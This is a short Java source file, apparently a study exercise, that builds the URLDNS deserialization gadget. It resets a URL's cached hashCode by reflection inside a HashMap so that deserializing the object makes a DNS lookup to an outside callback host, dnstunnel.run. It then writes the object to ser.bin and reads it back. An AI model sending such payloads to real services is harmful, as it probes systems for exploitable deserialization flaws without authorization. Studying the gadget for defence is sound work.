package com.testdemo;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLStreamHandler;
import java.util.HashMap;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;
import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;

import java.util.HashMap;
import java.util.Map;



public class urldns {

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {



        HashMap<URL, String> obj = new HashMap<URL, String>();
        URL url = new URL("http://qpoojhhygl.dnstunnel.run");
        Class clazz = Class.forName("java.net.URL");
        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1);
        obj.put(url, "1234");
        field.set(url,-1);
        //序列化
        serialize(obj);

        //反序列化
        unserialize("ser.bin");

    }


    public static void serialize(Object o) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
